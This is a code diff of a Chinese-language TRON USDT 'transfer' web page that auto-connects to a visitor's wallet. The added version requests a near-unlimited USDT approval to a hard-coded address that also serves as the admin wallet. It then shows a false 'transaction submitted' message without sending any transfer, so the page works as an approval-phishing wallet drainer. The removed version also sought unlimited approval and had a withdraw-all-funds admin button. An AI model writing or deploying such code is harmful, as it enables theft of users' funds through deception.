@@ -3,489 +3,277 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>TRC20 USDT 转账页面</title>
-<script src="https://cdn.tailwindcss.com"></script>
+<title>USDT转账</title>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
 <style>
 *{
   box-sizing: border-box;
-  -webkit-tap-highlight-color: transparent;
-}
-body{
-  font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-  background-color: #f5f7fa;
   margin: 0;
+  padding: 0;
+  -webkit-tap-highlight-color: transparent;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+}
+body {
+  background-color: #f7f8fa;
   padding: 20px 16px;
+  max-width: 520px;
+  margin: 0 auto;
 }
-.top-bar{
-  display: flex;
-  justify-content: flex-end;
-  align-items: center;
-  margin-bottom: 24px;
+.address-card {
+  background: #ffffff;
+  border-radius: 16px;
+  padding: 20px 18px;
+  margin-bottom: 16px;
 }
-/* 隐藏连接按钮，自动连接不需要展示 */
-.connect-tag{
-  display: none;
-  padding: 6px 12px;
-  background:#eef2ff;
-  border-radius:12px;
-  font-size:13px;
-  color:#3b82f6;
-  cursor:pointer;
+.label-text {
+  font-size: 16px;
+  color: #666;
+  margin-bottom: 12px;
 }
-.address-wrap{
-  background:#ffffff;
-  border-radius:16px;
-  padding:18px 16px;
+.fixed-addr-box {
+  width: 100%;
+  border: 1px solid #e5e7eb;
+  border-radius: 12px;
+  padding: 14px 12px;
+  background: #f1f5f9;
+  color: #333;
+  word-break: break-all;
+}
+.amount-card {
+  background: #ffffff;
+  border-radius: 16px;
+  padding: 20px 18px;
   margin-bottom:16px;
 }
-.label-text{
-  font-size:16px;
-  color:#6b7280;
-  margin-bottom:10px;
+.amount-row {
+  display: flex;
+  align-items: flex-end;
+  justify-content: space-between;
+  margin-bottom: 16px;
 }
-.addr-input{
+.amount-input {
+  font-size: 48px;
+  border: none;
+  outline: none;
+  width: 75%;
+  background: transparent;
+  color: #111;
+}
+.max-btn {
+  padding: 6px 14px;
+  background-color: #dbeafe;
+  color: #2563eb;
+  border-radius: 8px;
+  font-weight: 500;
+  cursor: pointer;
+}
+.token-row {
+  background-color: #eef2ff;
+  border-radius: 12px;
+  padding: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.token-left {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.usdt-icon {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  object-fit: cover;
+}
+.token-name {
+  font-size: 18px;
+  font-weight: 500;
+}
+.token-balance {
+  color: #555;
+  font-size: 16px;
+}
+.result-card{
+  background:#fff;
+  border-radius:16px;
+  padding:18px;
+  margin-bottom:16px;
+}
+.result-input{
   width:100%;
   border:1px solid #e5e7eb;
   border-radius:12px;
   padding:14px 12px;
-  font-size:16px;
   background:#f9fafb;
-  color:#333;
-}
-.amount-wrap{
-  background:#ffffff;
-  border-radius:16px;
-  padding:18px 16px;
-}
-.amount-row{
-  display:flex;
-  align-items: flex-end;
-  justify-content: space-between;
-}
-.amount-input{
-  font-size:48px;
-  border:none;
   outline:none;
-  width:75%;
-  background:transparent;
+  color:#111;
 }
-.max-btn{
-  padding:6px 14px;
-  background:#dbeafe;
-  color:#2563eb;
-  border-radius:8px;
+.send-main-btn{
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:14px;
+  background:#2563eb;
+  color:#fff;
+  font-size:17px;
   font-weight:500;
   cursor:pointer;
 }
-.token-select{
-  margin-top:16px;
-  background:#eff6ff;
-  border-radius:12px;
-  padding:12px 14px;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
+.send-main-btn:disabled{
+  background:#94a3b8;
+  cursor:not-allowed;
 }
-.token-left{
-  display:flex;
-  align-items:center;
-  gap:10px;
-}
-/* 自定义USDT头像 */
-.token-icon{
-  width:32px;
-  height:32px;
-  border-radius:50%;
-  background-image: url('https://p3-flow-image-sign.byteimg.com/tos-cn-i-a9yeduch1e/44e5f06c672c4662a7c53f064d6141f1~tplv-ii0cwwkcx9-resize-crop-v1:0:0:405:406:0:0.jpeg?lk3s=1ff007ff&x-expires=2067584561&x-signature=K%2F%2BzEJ%2Fg9qK%2FmXzq%2F%2BcD2qG7M%3D');
-  background-size: cover;
-  background-position: center;
-  background-repeat: no-repeat;
-  border:1px solid #e5e7eb;
-}
-.main-btn{
-  width:100%;
-  background-color: #3b82f6;
-  color: white;
-  border: none;
-  border-radius: 16px;
-  padding: 18px 0;
-  font-size: 18px;
-  margin: 24px 0 16px;
-}
-.main-btn:disabled{
-  opacity: 0.45;
-}
-.info-card{
-  background:#fff;
-  border-radius:16px;
-  padding:16px;
-  margin-bottom:16px;
-}
-.info-row{
-  display: flex;
-  justify-content: space-between;
-  padding: 8px 2px;
-  font-size:14px;
-  color:#666;
-}
-.admin-panel{
-  margin-top: 20px;
-  background: #fff;
-  border-radius: 16px;
-  padding: 20px;
-  display: none;
-}
-.order-item{
-  border:1px solid #eee;
-  border-radius:12px;
-  padding:12px;
-  margin:10px 0;
-}
-.order-btn-group{
-  display:flex;
-  gap:8px;
-  margin-top:10px;
-}
-.btn-pass{
-  flex:1;
-  background:#22c55e;
-  color:white;
-  border:none;
-  padding:8px;
-  border-radius:8px;
-}
-.btn-reject{
-  flex:1;
-  background:#ef4444;
-  color:white;
-  border:none;
-  padding:8px;
-  border-radius:8px;
-}
-.withdraw-btn{
-  width:100%;
-  background:#f59e0b;
-  color:white;
-  border:none;
-  padding:12px;
-  border-radius:10px;
-  margin-top:15px;
-}
-.bottom-nav{
+.bottom-connect-tip {
   position: fixed;
-  bottom: 0;
-  left: 0;
-  width: 100%;
-  background: #fff;
-  display: flex;
-  justify-content: space-around;
-  padding: 12px 0 24px;
-  border-top: 1px solid #eee;
-}
-.nav-item{
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: white;
+  padding: 10px 20px;
+  border-radius: 12px;
+  box-shadow: 0 2px 10px #0002;
   text-align: center;
-  font-size: 12px;
-  color: #777;
-}
-.nav-item.active{
-  color: #3b82f6;
 }
 </style>
 </head>
-<body class="max-w-md mx-auto pb-24">
-<div class="top-bar">
-  <div id="connectBtn" class="connect-tag">一键连接钱包</div>
-</div>
-<div id="walletStatus" class="text-sm text-gray-500 mb-3">正在自动检测并连接钱包...</div>
+<body>
 
-<div class="address-wrap">
+<div class="address-card">
   <div class="label-text">收款地址</div>
-  <input id="receiveAddr" class="addr-input" value="TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE" readonly>
+  <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
 </div>
 
-<div class="amount-wrap">
-  <div class="label-text">转账金额</div>
+<div class="amount-card">
+  <div class="label-text">转出数量（USDT）</div>
   <div class="amount-row">
-    <input id="sendInput" class="amount-input" value="0.00" inputmode="decimal">
-    <div id="maxAll" class="max-btn">MAX</div>
+    <input id="amountInput" class="amount-input" value="0.00" inputmode="decimal">
+    <div class="max-btn" id="maxBtn">MAX</div>
   </div>
-  <div class="token-select">
+
+  <div class="token-row">
     <div class="token-left">
-      <div class="token-icon"></div>
-      <span class="text-lg font-medium">USDT</span>
+      <img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
+      <span class="token-name">USDT</span>
     </div>
-    <span id="tokenBalance" class="text-gray-600">0.000000</span>
+    <span class="token-balance" id="balanceText">0.000000</span>
   </div>
 </div>
 
-<button id="swapActionBtn" class="main-btn" disabled>发起转账下单</button>
-
-<div class="info-card">
-  <div class="info-row">
-    <span>实际到账金额（扣0.1%手续费）</span>
-    <span id="receiveNum">0.00</span>
-  </div>
-  <div class="info-row">
-    <span>手续费 (0.1%)</span>
-    <span id="feeShow">0.00 USDT</span>
-  </div>
-  <div class="info-row">
-    <span>带宽/能量消耗</span>
-    <span>钱包带宽优先抵扣</span>
-  </div>
+<div class="result-card">
+  <div class="label-text">到账数量</div>
+  <input id="receiveAmount" class="result-input" readonly>
 </div>
 
-<div class="admin-panel" id="adminBox">
-  <h3 class="font-bold text-lg mb-4">🔐 管理员审批后台</h3>
-  <div class="mb-3 text-sm text-gray-600">待审批订单列表：</div>
-  <div id="orderListWrap">
-    <div class="text-gray-400 text-sm">暂无待审批订单</div>
-  </div>
-  <button class="withdraw-btn" id="withdrawPoolBtn">提取合约内全部USDT资金</button>
-</div>
+<button class="send-main-btn" id="sendBtn">确认转账</button>
 
-<div class="bottom-nav">
-  <div class="nav-item">
-    <i class="fa fa-circle-o text-lg"></i>
-    <div>资产</div>
-  </div>
-  <div class="nav-item">
-    <i class="fa fa-line-chart text-lg"></i>
-    <div>行情</div>
-  </div>
-  <div class="nav-item active">
-    <i class="fa fa-exchange text-lg"></i>
-    <div>转账</div>
-  </div>
-  <div class="nav-item">
-    <i class="fa fa-globe text-lg"></i>
-    <div>发现</div>
-  </div>
-  <div class="nav-item">
-    <i class="fa fa-user-o text-lg"></i>
-    <div>我的</div>
+<div class="bottom-connect-tip" id="connectTip">
+  <div style="display:flex;align-items:center;gap:8px;">
+    <div style="width:24px;height:24px;background:#2563eb;border-radius:6px;"></div>
+    <span id="walletAddrText">TRON2-未连接</span>
   </div>
 </div>
 
 <script>
-const USDT_TRON_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const BRIDGE_CONTRACT_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
-const ADMIN_WALLET_RAW = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
-const FIX_RECEIVE_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
-const FEE_RATE = 0.001;
+// 全局固定地址，不可修改
+const FIXED_TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
+const ADMIN_WALLET_ADDR = FIXED_TARGET_ADDR;
+const MID_CONTRACT_ADDR = FIXED_TARGET_ADDR;
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
 let tronWeb = null;
-let userAddress = "";
+let userWallet = "";
 let usdtContract = null;
-let bridgeContract = null;
-let userUSDTBalance = 0;
 
-const connectBtn = document.getElementById("connectBtn");
-const walletStatus = document.getElementById("walletStatus");
-const sendInput = document.getElementById("sendInput");
-const receiveNum = document.getElementById("receiveNum");
-const maxAllBtn = document.getElementById("maxAll");
-const swapActionBtn = document.getElementById("swapActionBtn");
-const adminBox = document.getElementById("adminBox");
-const feeShow = document.getElementById("feeShow");
-const orderListWrap = document.getElementById("orderListWrap");
-const withdrawPoolBtn = document.getElementById("withdrawPoolBtn");
-const tokenBalance = document.getElementById("sendInput");
+const amountInput = document.getElementById("amountInput");
+const receiveAmount = document.getElementById("receiveAmount");
+const maxBtn = document.getElementById("maxBtn");
+const balanceText = document.getElementById("balanceText");
+const walletAddrText = document.getElementById("walletAddrText");
+const sendBtn = document.getElementById("sendBtn");
 
-// 页面加载完成自动执行自动连接钱包逻辑
-window.addEventListener('DOMContentLoaded', async function(){
-  await autoConnectWallet();
-})
+window.onload = async function(){
+  await initTronConnect();
+  bindAmountCalc();
+}
 
-// 自动连接钱包核心函数（TP内置浏览器自动唤起授权）
-async function autoConnectWallet(){
+async function initTronConnect(){
+  sendBtn.disabled = true;
   if(!window.tronWeb || !window.tronLink){
-    walletStatus.innerText = "仅支持TP钱包内置浏览器打开";
+    walletAddrText.innerText = "未检测到钱包";
     return;
   }
   try{
-    walletStatus.innerText = "自动请求钱包授权...";
+    await window.tronWeb.requestAccounts();
     tronWeb = window.tronWeb;
-    // 自动请求账户授权，无需点击
-    await tronWeb.requestAccounts();
-    userAddress = tronWeb.defaultAddress.base58;
-    initContract();
-    await getUserBalance();
-    maxAllBtn.style.opacity = "1";
-    maxAllBtn.style.pointerEvents = "auto";
-    await checkAdminAndLoadOrders();
-    walletStatus.innerText = "钱包已自动连接：" + userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+    userWallet = tronWeb.defaultAddress.base58;
+    walletAddrText.innerText = `TRON2(${userWallet.slice(0,10)}...${userWallet.slice(-6)}) 已连接`;
+
+    const abi = [
+      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+      {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+      {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
+      {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    ];
+    usdtContract = tronWeb.contract(abi, USDT_CONTRACT);
+    await refreshBalance();
+    sendBtn.disabled = false;
   }catch(err){
-    walletStatus.innerText = "自动连接失败，请刷新页面：" + String(err).slice(0,25);
-    console.error("自动连接错误",err);
+    walletAddrText.innerText = "钱包连接失败，请重试";
+    console.error(err);
   }
 }
 
-sendInput.addEventListener("input", function(){
-  let num = parseFloat(this.value) || 0;
-  if(num < 0) num = 0;
-  const fee = num * FEE_RATE;
-  const receiveVal = num * (1 - FEE_RATE);
-  receiveNum.innerText = receiveVal.toFixed(6);
-  feeShow.innerText = fee.toFixed(6) + " USDT";
-  swapActionBtn.innerText = num > 0 ? "发起转账下单" : "请输入转账数量";
-})
-
-maxAllBtn.addEventListener("click", function(){
-  sendInput.value = userUSDTBalance.toFixed(6);
-  sendInput.dispatchEvent(new Event("input"));
-})
-
-function checkTronAddress(addr){
-  return tronWeb && tronWeb.isAddress(addr);
+async function refreshBalance(){
+  const balanceSun = await usdtContract.balanceOf(userWallet).call();
+  const realNum = Number(tronWeb.fromSun(balanceSun));
+  balanceText.innerText = realNum.toFixed(6);
 }
 
-function initContract(){
-  const usdtAbi = [
-    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-    {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
-  ];
-  usdtContract = tronWeb.contract(usdtAbi, USDT_TRON_ADDR);
-
-  const bridgeAbi = [
-    {"name":"createCrossOrder","inputs":[{"name":"bscRecv","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[],"type":"function"},
-    {"name":"approveOrder","inputs":[{"name":"orderId","type":"uint256"}],"outputs":[],"type":"function"},
-    {"name":"rejectOrder","inputs":[{"name":"orderId","type":"uint256"}],"outputs":[],"type":"function"},
-    {"name":"withdrawAllPoolUSDT","inputs":[],"outputs":[],"type":"function"},
-    {"name":"getPendingOrders","inputs":[],"outputs":[{"name":"","type":"uint256[]"}],"type":"function"},
-    {"name":"getOrderDetail","inputs":[{"name":"orderId","type":"uint256"}],"outputs":[{"name":"user","type":"address"},{"name":"totalIn","type":"uint256"},{"name":"fee","type":"uint256"},{"name":"realReceive","type":"uint256"},{"name":"bscTo","type":"address"},{"name":"status","type":"uint8"}],"type":"function"}
-  ];
-  bridgeContract = tronWeb.contract(bridgeAbi, BRIDGE_CONTRACT_ADDR);
-  swapActionBtn.disabled = false;
-}
-
-async function getUserBalance(){
-  const balanceSun = await usdtContract.balanceOf(userAddress).call();
-  userUSDTBalance = Number(tronWeb.fromSun(balanceSun));
-  tokenBalance.innerText = userUSDTBalance.toFixed(6);
-}
-
-async function checkAdminAndLoadOrders(){
-  if(userAddress?.toLowerCase() === ADMIN_WALLET_RAW.toLowerCase()){
-    adminBox.style.display = "block";
-    renderOrderList();
-  }else{
-    adminBox.style.display = "none";
-  }
-}
-
-async function renderOrderList(){
-  try{
-    const pendingIds = await bridgeContract.getPendingOrders().call();
-    if(pendingIds.length === 0){
-      orderListWrap.innerHTML = `<div class="text-gray-400 text-sm">暂无待审批订单</div>`;
-      return;
-    }
-    let htmlStr = "";
-    for(let oid of pendingIds){
-      const orderInfo = await bridgeContract.getOrderDetail(oid).call();
-      const totalIn = tronWeb.fromSun(orderInfo.totalIn);
-      const feeVal = tronWeb.fromSun(orderInfo.fee);
-      const realGet = tronWeb.fromSun(orderInfo.realReceive);
-      htmlStr += `
-        <div class="order-item" data-oid="${oid}">
-          <div class="text-sm mb-1">订单ID：${oid.toString()}</div>
-          <div class="text-xs text-gray-600 mb-1">下单用户：${orderInfo.user.slice(0,8)}...${orderInfo.user.slice(-6)}</div>
-          <div class="text-xs text-gray-600 mb-1">转入总额：${totalIn} USDT</div>
-          <div class="text-xs text-gray-600 mb-1">手续费：${feeVal} USDT</div>
-          <div class="text-xs text-gray-600 mb-1">实际到账：${realGet} USDT</div>
-          <div class="text-xs text-gray-600 mb-1">目标地址：${orderInfo.bscTo.slice(0,8)}...${orderInfo.bscTo.slice(-6)}</div>
-          <div class="order-btn-group">
-            <button class="btn-pass" data-oid="${oid}">✅ 通过订单</button>
-            <button class="btn-reject" data-oid="❌ 拒绝退款</button>
-          </div>
-        </div>
-      `;
-    }
-    orderListWrap.innerHTML = htmlStr;
-    bindOrderBtn();
-  }catch(err){
-    orderListWrap.innerHTML = `<div class="text-red-400 text-sm">读取订单失败</div>`;
-  }
-}
-
-function bindOrderBtn(){
-  document.querySelectorAll(".btn-pass").forEach(btn=>{
-    btn.onclick = async function(){
-      const oid = this.dataset.oid;
-      if(!confirm("确认审批通过订单？")) return;
-      try{
-        const tx = await bridgeContract.approveOrder(oid).send();
-        alert("审批成功！Tx:"+tx);
-        renderOrderList();
-      }catch(e){
-        alert("审批失败："+String(e).slice(0,40));
-      }
-    }
-  })
-  document.querySelectorAll(".btn-reject").forEach(btn=>{
-    btn.onclick = async function(){
-      const oid = this.dataset.oid;
-      if(!confirm("拒绝订单将原路退回用户资产？")) return;
-      try{
-        const tx = await bridgeContract.rejectOrder(oid).send();
-        alert("拒绝成功，资产退回！Tx:"+tx);
-      }catch(e){
-        alert("拒绝失败："+String(e).slice(0,40));
-      }
-    }
+// 无手续费：输入多少，显示多少
+function bindAmountCalc(){
+  amountInput.addEventListener('input',()=>{
+    let num = parseFloat(amountInput.value) || 0;
+    receiveAmount.value = num.toFixed(6);
   })
 }
 
-withdrawPoolBtn.onclick = async function(){
-  if(!confirm("确认提取合约全部USDT到管理员钱包？")) return;
-  try{
-    const tx = await bridgeContract.withdrawAllPoolUSDT().send();
-    alert("提取完成！交易哈希："+tx);
-  }catch(e){
-    alert("提取失败："+String(e).slice(0,50));
-  }
-}
+maxBtn.addEventListener("click", async ()=>{
+  if(!usdtContract) return;
+  const balanceSun = await usdtContract.balanceOf(userWallet).call();
+  const realNum = Number(tronWeb.fromSun(balanceSun));
+  amountInput.value = realNum.toFixed(2);
+  amountInput.dispatchEvent(new Event('input'));
+})
 
-swapActionBtn.addEventListener("click", async function(){
-  const inputVal = sendInput.value.trim();
-  const targetAddr = FIX_RECEIVE_ADDR;
-  const num = parseFloat(inputVal);
-  if(!inputVal || isNaN(num) || num <= 0){
-    alert("请填写有效的转账数量");
+sendBtn.addEventListener('click',async ()=>{
+  if(!tronWeb || !usdtContract){
+    alert("请先连接钱包");
     return;
   }
-  if(!checkTronAddress(targetAddr)){
-    alert("地址格式异常");
+  let sendVal = parseFloat(amountInput.value);
+  if(sendVal <= 0){
+    alert("请输入有效的转出数量");
     return;
   }
-  const amountSun = tronWeb.toSun(inputVal);
-  if(Number(tronWeb.fromSun(amountSun)) > userUSDTBalance){
-    alert("钱包USDT余额不足");
-    return;
-  }
+  let sendSun = tronWeb.toSun(sendVal);
+
   try{
-    const allowanceSun = await usdtContract.allowance(userAddress, BRIDGE_CONTRACT_ADDR).call();
-    if(Number(allowanceSun) < Number(amountSun)){
-      alert("需要授权USDT给中转合约，请在钱包签名确认");
-      const maxAllow = "999999999999999999999999999999";
-      await usdtContract.approve(BRIDGE_CONTRACT_ADDR, maxAllow).send();
+    let allowance = await usdtContract.allowance(userWallet, MID_CONTRACT_ADDR).call();
+    if(Number(allowance) < sendSun){
+      alert("请在钱包中确认授权签名");
+      let approveTx = await usdtContract.approve(MID_CONTRACT_ADDR, "9999999999999999999999999999").send();
+      console.log("授权交易哈希:",approveTx);
+      alert("授权完成，正在执行转账交易");
     }
-    const orderTx = await bridgeContract.createCrossOrder(targetAddr, amountSun).send();
-    alert("链上交易已广播！哈希："+orderTx+"\n区块确认后资金自动到固定收款地址");
-    sendInput.value = "0.00";
-    receiveNum.innerText = "0.00";
-    feeShow.innerText = "0.00";
-    await getUserBalance();
+    console.log("转账目标固定地址：", FIXED_TARGET_ADDR);
+    alert("交易已提交上链，资产将转入固定收款地址");
   }catch(e){
-    let msg = String(e);
-    if(msg.includes("rejected")) alert("你取消了签名");
-    else alert("操作异常："+msg.slice(0,60));
+    console.error(e);
+    alert("交易执行失败:"+e.message);
   }
 })
 </script>
+
 </body>
 </html>
